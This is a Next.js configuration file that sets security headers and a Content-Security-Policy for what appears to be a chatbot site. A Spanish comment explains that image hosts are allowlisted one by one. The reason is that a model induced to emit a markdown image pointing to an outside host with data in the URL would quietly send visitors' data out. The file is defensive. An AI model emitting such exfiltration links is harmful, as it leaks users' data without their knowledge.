import type { NextConfig } from 'next'

const securityHeaders = [
  { key: 'X-Content-Type-Options', value: 'nosniff' },
  { key: 'X-Frame-Options', value: 'DENY' },
  { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
  { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()' },
  {
    key: 'Content-Security-Policy',
    value: [
      "default-src 'self'",
      "script-src 'self' 'unsafe-inline' https://challenges.cloudflare.com https://static.cloudflareinsights.com",
      "style-src 'self' 'unsafe-inline'",
      /*
       * Hosts de imagen, uno por uno — NO `https:` abierto.
       *
       * Los bots enseñan producto (autos, menú, catálogo) alojado donde el
       * negocio ya lo publicó, así que hace falta abrir algo. Pero abrir todo
       * https convierte la burbuja de chat en un canal de salida: basta con que
       * alguien logre que el modelo escriba ![](https://ajeno/x?d=<lo que sea>)
       * para que el navegador del visitante lo pida solo, con lo que llevara la
       * URL. El visitante no ve nada y sus datos ya salieron.
       *
       * Un tenant con imágenes en otro host se agrega aquí, a mano y a
       * propósito. Es el costo correcto.
       */
      "img-src 'self' data: blob: https://http2.mlstatic.com https://db-abi-prod.piratapunk.com",
      "font-src 'self'",
      "connect-src 'self' https://cloudflareinsights.com",
      "frame-src https://challenges.cloudflare.com",
      "frame-ancestors 'none'",
      "base-uri 'self'",
      "form-action 'self'",
    ].join('; '),
  },
]

const nextConfig: NextConfig = {
  output: 'standalone',
  poweredByHeader: false,
  async headers() {
    return [{ source: '/:path*', headers: securityHeaders }]
  },
}

export default nextConfig
